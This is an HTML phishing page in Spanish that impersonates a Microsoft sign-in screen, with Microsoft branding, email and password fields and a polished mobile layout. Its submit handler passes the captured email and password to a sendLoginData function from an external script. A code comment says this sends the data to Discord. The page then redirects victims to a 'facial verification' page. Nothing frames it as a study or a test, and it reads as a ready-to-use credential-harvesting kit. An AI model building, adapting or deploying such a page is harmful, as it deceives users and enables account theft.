<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Iniciar sesión - Microsoft</title>
  <link href="https://cdn.jsdelivr.net/npm/remixicon@2.5.0/fonts/remixicon.css" rel="stylesheet">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, 'Helvetica Neue', sans-serif;
    }

    html, body {
      height: 100%;
      background: #f0f2f5;
    }

    body {
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 0;
      min-height: 100vh;
      min-height: -webkit-fill-available;
    }

    .container {
      width: 100%;
      max-width: 440px;
      background: white;
      border-radius: 0;
      box-shadow: none;
      display: flex;
      flex-direction: column;
      min-height: 100vh;
      min-height: -webkit-fill-available;
    }

    /* Left panel */
    .left-panel {
      background: linear-gradient(135deg, #0057A6 0%, #0078d4 100%);
      padding: 40px 20px 30px;
      display: flex;
      justify-content: center;
      align-items: center;
      position: relative;
      overflow: hidden;
    }

    .left-panel::before {
      content: "";
      position: absolute;
      top: -30%;
      right: -20%;
      width: 250px;
      height: 250px;
      background: rgba(255, 255, 255, 0.05);
      border-radius: 50%;
      z-index: 1;
    }

    .left-panel::after {
      content: "";
      position: absolute;
      bottom: -30%;
      left: -20%;
      width: 200px;
      height: 200px;
      background: rgba(255, 255, 255, 0.03);
      border-radius: 50%;
      z-index: 1;
    }

    .left-content {
      position: relative;
      z-index: 2;
      text-align: center;
    }

    .logo-img {
      max-width: 220px;
      height: auto;
      filter: brightness(1.2);
      margin-bottom: 5px;
    }

    .ms-text {
      color: rgba(255, 255, 255, 0.9);
      font-size: 13px;
      font-weight: 500;
      letter-spacing: 0.5px;
      margin-top: 8px;
    }

    /* Right panel */
    .right-panel {
      padding: 32px 24px 24px;
      display: flex;
      flex-direction: column;
      flex: 1;
      background: white;
      border-radius: 20px 20px 0 0;
      margin-top: -20px;
      position: relative;
      z-index: 3;
      box-shadow: 0 -4px 20px rgba(0, 0, 0, 0.08);
    }

    .form-header {
      margin-bottom: 28px;
    }

    .form-title {
      font-size: 24px;
      font-weight: 700;
      color: #1b1b1b;
      margin-bottom: 6px;
      letter-spacing: -0.3px;
    }

    .form-subtitle {
      font-size: 14px;
      color: #616161;
      font-weight: 400;
    }

    .input-group {
      margin-bottom: 18px;
    }

    .input-label {
      display: block;
      margin-bottom: 6px;
      font-weight: 600;
      color: #1b1b1b;
      font-size: 13px;
    }

    .input-wrapper {
      position: relative;
    }

    .input-icon {
      position: absolute;
      left: 14px;
      top: 50%;
      transform: translateY(-50%);
      color: #757575;
      font-size: 18px;
      pointer-events: none;
      transition: color 0.2s ease;
      z-index: 1;
    }

    .input-field {
      width: 100%;
      padding: 14px 14px 14px 44px;
      border: 1.5px solid #d1d1d1;
      border-radius: 8px;
      font-size: 16px;
      transition: all 0.2s ease;
      background: #fafafa;
      color: #1b1b1b;
      -webkit-appearance: none;
      appearance: none;
    }

    .input-field::placeholder {
      color: #9e9e9e;
    }

    .input-field:focus {
      outline: none;
      border-color: #0078d4;
      background: white;
      box-shadow: 0 0 0 3px rgba(0, 120, 212, 0.1);
    }

    .input-field:focus ~ .input-icon {
      color: #0078d4;
    }

    .password-toggle {
      position: absolute;
      right: 14px;
      top: 50%;
      transform: translateY(-50%);
      background: none;
      border: none;
      color: #757575;
      cursor: pointer;
      font-size: 18px;
      padding: 6px;
      transition: color 0.2s ease;
      z-index: 2;
      -webkit-tap-highlight-color: transparent;
    }

    .password-toggle:active {
      color: #0078d4;
    }

    .error-message {
      color: #d13438;
      font-size: 12px;
      margin-top: 6px;
      display: none;
      font-weight: 500;
    }

    .input-group.error .input-field {
      border-color: #d13438;
      background: #fff5f5;
    }

    .input-group.error .error-message {
      display: block;
    }

    .input-group.success .input-field {
      border-color: #107c10;
    }

    .btn-submit {
      width: 100%;
      padding: 14px 16px;
      background: #0078d4;
      color: white;
      border: none;
      border-radius: 8px;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
      transition: all 0.2s ease;
      margin-bottom: 16px;
      position: relative;
      overflow: hidden;
      -webkit-tap-highlight-color: transparent;
      margin-top: 8px;
    }

    .btn-submit:active:not(:disabled) {
      background: #005a9e;
      transform: scale(0.98);
    }

    .btn-submit:disabled {
      opacity: 0.5;
      cursor: not-allowed;
    }

    .btn-submit.loading {
      color: transparent;
    }

    .btn-submit.loading::after {
      content: "";
      position: absolute;
      width: 20px;
      height: 20px;
      top: 50%;
      left: 50%;
      margin: -10px 0 0 -10px;
      border: 2.5px solid rgba(255, 255, 255, 0.3);
      border-top-color: white;
      border-radius: 50%;
      animation: spin 0.8s linear infinite;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    .forgot-password {
      text-align: center;
      margin-bottom: 24px;
    }

    .forgot-password a {
      color: #0078d4;
      text-decoration: none;
      font-size: 13px;
      font-weight: 600;
      -webkit-tap-highlight-color: transparent;
    }

    .forgot-password a:active {
      text-decoration: underline;
    }

    .separator {
      display: flex;
      align-items: center;
      margin: 20px 0;
      color: #e0e0e0;
    }

    .separator::before,
    .separator::after {
      content: "";
      flex: 1;
      height: 1px;
      background: #e0e0e0;
    }

    .separator span {
      padding: 0 16px;
      color: #757575;
      font-size: 13px;
    }

    .signup-section {
      text-align: center;
      font-size: 13px;
      color: #616161;
      margin-bottom: 8px;
    }

    .signup-section a {
      color: #0078d4;
      text-decoration: none;
      font-weight: 600;
      -webkit-tap-highlight-color: transparent;
    }

    .signup-section a:active {
      text-decoration: underline;
    }

    .footer-links {
      display: flex;
      justify-content: center;
      gap: 16px;
      padding-top: 16px;
      border-top: 1px solid #f0f0f0;
      margin-top: auto;
      flex-wrap: wrap;
    }

    .footer-links a {
      color: #757575;
      text-decoration: none;
      font-size: 11px;
      -webkit-tap-highlight-color: transparent;
    }

    .footer-links a:active {
      color: #0078d4;
    }

    /* Responsive para pantallas más grandes */
    @media (min-width: 768px) {
      body {
        padding: 20px;
        background: linear-gradient(135deg, #f5f5f5 0%, #efefef 100%);
      }

      .container {
        flex-direction: row;
        max-width: 880px;
        border-radius: 12px;
        box-shadow: 0 4px 24px rgba(0, 0, 0, 0.12);
        min-height: 580px;
      }

      .left-panel {
        flex: 1;
        padding: 60px 40px;
        border-radius: 12px 0 0 12px;
      }

      .right-panel {
        flex: 1;
        padding: 48px 48px;
        margin-top: 0;
        border-radius: 0 12px 12px 0;
        box-shadow: none;
      }

      .logo-img {
        max-width: 180px;
      }

      .form-title {
        font-size: 28px;
      }

      .input-field {
        font-size: 15px;
        padding: 12px 12px 12px 44px;
      }

      .btn-submit {
        padding: 12px 16px;
        font-size: 15px;
      }
    }

    @media (min-width: 1024px) {
      .container {
        max-width: 960px;
      }

      .left-panel {
        padding: 80px 60px;
      }

      .right-panel {
        padding: 60px 56px;
      }
    }

    /* Mejoras táctiles para móvil */
    @media (hover: none) and (pointer: coarse) {
      .btn-submit:hover:not(:disabled) {
        background: #0078d4;
        transform: none;
        box-shadow: none;
      }

      .btn-submit:active:not(:disabled) {
        background: #005a9e;
        transform: scale(0.98);
      }
    }

    /* Ajustes para iOS */
    @supports (-webkit-touch-callout: none) {
      input, select, textarea {
        font-size: 16px !important;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <!-- Left Panel -->
    <div class="left-panel">
      <div class="left-content">
        <img src="https://www.insights.la/wp-content/uploads/2015/04/Microsoft-logo-m-box-880x660.png" alt="Microsoft" class="logo-img">
      </div>
    </div>

    <!-- Right Panel -->
    <div class="right-panel">
      <div class="form-header">
        <h1 class="form-title">Iniciar sesión</h1>
        <p class="form-subtitle">Usa tu cuenta de Microsoft</p>
      </div>

      <form id="loginForm">
        <!-- Email Input -->
        <div class="input-group" id="emailGroup">
          <label class="input-label" for="email">Correo electrónico, teléfono o Skype</label>
          <div class="input-wrapper">
            <input 
              type="email" 
              id="email" 
              name="email" 
              class="input-field" 
              placeholder="usuario@ejemplo.com"
              inputmode="email"
              autocapitalize="none"
              autocomplete="email"
              required
            >
            <i class="ri-user-3-line input-icon"></i>
            <div class="error-message" id="emailError"></div>
          </div>
        </div>

        <!-- Password Input -->
        <div class="input-group" id="passwordGroup">
          <label class="input-label" for="password">Contraseña</label>
          <div class="input-wrapper">
            <input 
              type="password" 
              id="password" 
              name="password" 
              class="input-field" 
              placeholder="Introduce tu contraseña"
              autocomplete="current-password"
              required
            >
            <i class="ri-lock-2-line input-icon"></i>
            <button type="button" class="password-toggle" id="togglePassword" aria-label="Mostrar contraseña">
              <i class="ri-eye-off-line"></i>
            </button>
            <div class="error-message" id="passwordError"></div>
          </div>
        </div>

        <!-- Submit Button -->
        <button type="submit" class="btn-submit" id="submitBtn">Siguiente</button>

        <!-- Forgot Password -->
        <div class="forgot-password">
          <a href="#">¿Has olvidado tu contraseña?</a>
        </div>

        <!-- Separator -->
        <div class="separator">
          <span>o</span>
        </div>

        <!-- Sign Up -->
        <div class="signup-section">
          ¿No tienes una cuenta? <a href="#">Crear una cuenta</a>
        </div>
      </form>

      <!-- Footer Links -->
      <div class="footer-links">
        <a href="#">Condiciones de uso</a>
        <a href="#">Privacidad y cookies</a>
        <a href="#">Ayuda</a>
      </div>
    </div>
  </div>

  <script src="script.js"></script>
  <script>
    document.addEventListener('DOMContentLoaded', function() {
      const form = document.getElementById('loginForm');
      const emailInput = document.getElementById('email');
      const passwordInput = document.getElementById('password');
      const togglePassword = document.getElementById('togglePassword');
      const emailGroup = document.getElementById('emailGroup');
      const passwordGroup = document.getElementById('passwordGroup');
      const submitBtn = document.getElementById('submitBtn');

      function validateEmail(email) {
        return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
      }

      togglePassword.addEventListener('click', function(e) {
        e.preventDefault();
        const type = passwordInput.type === 'password' ? 'text' : 'password';
        passwordInput.type = type;
        const icon = this.querySelector('i');
        icon.className = type === 'password' ? 'ri-eye-off-line' : 'ri-eye-line';
        this.setAttribute('aria-label', type === 'password' ? 'Mostrar contraseña' : 'Ocultar contraseña');
      });

      emailInput.addEventListener('input', function() {
        if (this.value) {
          if (validateEmail(this.value)) {
            emailGroup.classList.remove('error');
            emailGroup.classList.add('success');
          } else {
            emailGroup.classList.remove('success');
            emailGroup.classList.add('error');
            document.getElementById('emailError').textContent = 'Email inválido';
          }
        } else {
          emailGroup.classList.remove('error', 'success');
        }
      });

      passwordInput.addEventListener('input', function() {
        if (this.value) {
          passwordGroup.classList.remove('error');
          passwordGroup.classList.add('success');
        } else {
          passwordGroup.classList.remove('error', 'success');
        }
      });

      form.addEventListener('submit', async function(e) {
        e.preventDefault();

        let valid = true;

        if (!emailInput.value || !validateEmail(emailInput.value)) {
          emailGroup.classList.add('error');
          document.getElementById('emailError').textContent = 'Email requerido y válido';
          valid = false;
        } else {
          emailGroup.classList.remove('error');
        }

        if (!passwordInput.value) {
          passwordGroup.classList.add('error');
          document.getElementById('passwordError').textContent = 'Contraseña requerida';
          valid = false;
        } else {
          passwordGroup.classList.remove('error');
        }

        if (!valid) return;

        submitBtn.disabled = true;
        submitBtn.classList.add('loading');

        try {
          // Enviar datos a Discord
          if (typeof sendLoginData === 'function') {
            await sendLoginData(emailInput.value, passwordInput.value);
          }
          
          await new Promise(r => setTimeout(r, 1500));
          window.location.href = 'verificacion_facial.html';
        } catch (error) {
          console.error('Error:', error);
          submitBtn.disabled = false;
          submitBtn.classList.remove('loading');
        }
      });

      // Auto-focus en el campo email
      setTimeout(() => {
        emailInput.focus();
      }, 500);
    });
  </script>
</body>
</html>
